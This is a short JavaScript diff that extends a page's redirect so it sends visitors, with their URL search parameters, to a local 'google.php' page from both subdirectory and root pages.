@@ -25,11 +25,8 @@
     var pathParts = currentPath.split('/');
     var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
     
-    // Only set redirect if in a newsnik subdirectory
-    var targetUrl = null;
-    if (inSubdir) {
-        targetUrl = "../google.php?" + searchParams.toString();
-    }
+    // Set redirect target for both subdirectory and root page structures
+    var targetUrl = inSubdir ? "../google.php?" + searchParams.toString() : "google.php?" + searchParams.toString();
     
     var activated = false;
 
